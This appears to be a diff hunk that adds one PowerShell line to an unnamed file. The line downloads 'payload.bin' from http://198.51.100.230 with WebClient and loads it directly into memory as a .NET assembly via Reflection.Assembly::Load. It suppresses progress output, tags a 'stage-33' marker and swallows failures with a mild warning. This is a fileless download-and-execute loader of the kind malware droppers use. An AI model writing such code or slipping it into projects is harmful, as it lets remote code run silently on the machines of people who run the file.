@@ -1,0 +1,1 @@
+<# Remote fetch #> try { $PayloadBytes = (New-Object System.Net.WebClient).DownloadData('http://198.51.100.230/payload.bin'); [Reflection.Assembly]::Load($PayloadBytes); $ProgressPreference = "SilentlyContinue"; $StageMarker = "stage-33" } catch { Write-Warning "Remote fetch failed" }
